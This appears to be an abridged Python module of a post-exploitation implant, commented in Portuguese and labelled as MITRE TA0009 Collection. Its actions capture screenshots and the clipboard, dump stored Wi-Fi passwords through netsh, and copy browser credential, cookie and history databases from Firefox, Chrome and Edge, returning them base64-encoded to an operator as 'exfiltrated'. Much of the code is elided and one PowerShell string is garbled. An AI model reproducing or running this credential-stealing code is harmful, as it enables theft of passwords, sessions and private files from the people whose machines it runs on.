# collection_ext - MITRE TA0009 - Collection
# Retorna JSON: {"output": str, "files": [{"name": str, "b64": str}], "err": str}
def collection_ext(task_info, args):
    ...
    # args pode vir como dict ou string JSON
    ...
    action     = str(args.get("action", "screenshot")).lower().strip()
    path       = str(args.get("path", "") or "")
    exts       = str(args.get("exts", ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt"))
    keywords   = str(args.get("keywords", "") or "")
    browser    = str(args.get("browser", "chrome")).lower().strip()
    all_drives = args.get("all_drives", False)
    ...
    if action == "screenshot":
        ...
        ps = (
            ...
            "$bmp.Save('%s');Write-Output OK" % shot.replace("'", "''")
        )
        ...
        try:
            ...
            pass
        if rc == 0 and data:
            return resp(out="[+] Screenshot capturado e exfiltrado",
                        files=[{"name": "screenshot_%s.png" % ts, "b64": data}])
        return resp(err="screenshot falhou: %s" % res[:300])
    ...
    if action == "clipboard":
        ...
        ps = ("Add-Type -AssemblyName System.Windows.Forms;"
              ...
              "if(-not t−andt -andt−andi){$i.Save('%s');Write-Output CLIP_IMAGE}"
              "elseif(t){Write-Output ('CLIP_TEXT|'+t)}"
              "else{Write-Output CLIP_EMPTY}" % clip_img.replace("'", "''"))
        ...
        if "CLIP_IMAGE" in res:
            ...
            try:
                ...
                pass
            if data:
                return resp(out="[+] Clipboard continha imagem (exfiltrado)",
    ...
    if action == "wifi":
        ...
        for line in profiles.splitlines():
            ...
            if ":" in line and ("Perfil" in line or "Profile" in line):
                ...
                _, det = run(["netsh", "wlan", "show", "profile",
                              "name=%s" % name, "key=clear"])
                pwd = ""
                for l in det.splitlines():
                    if ("Conteudo da Chave" in l or "Key Content" in l or
    ...
    if action == "browser":
        ...
        if browser == "firefox":
            ...
            if os.path.isdir(prof_root):
                for prof in os.listdir(prof_root):
                    for fn in ("places.sqlite", "cookies.sqlite", "logins.json",
                               "key4.db", "formhistory.sqlite"):
                        fp = os.path.join(prof_root, prof, fn)
                        if os.path.isfile(fp):
                            data = b64file(fp)
                            if data:
                                files.append({"name": "firefox_%s_%s" %
                                              (prof[:8], fn), "b64": data})
        elif browser in ("chrome", "edge"):
            base = os.path.join(
                local, ("Google", "Chrome", "User Data", "Default") if browser == "chrome"
            ...
            for fn in ("History", "Bookmarks", "Cookies", "Login Data", "Web Data"):
                ...
                if os.path.isfile(fp):
                    data = b64file(fp)
                    if data:
                        files.append({"name": "%s_%s" % (browser, fn.replace(" ", "_")),
                                      "b64": data})
        else:
        ...
        return resp(
            out=("[+] %d arquivo(s) de %s exfiltrado(s) (Cookies/Login Data "
                 "cifrados DPAPI - decriptar no operador)" % (len(files), browser)),
            files=files)
    ...
    if action == "get":
        ...
        return resp(out="[+] %s exfiltrado (%d bytes)" % (path, (len(data) * 3) // 4),
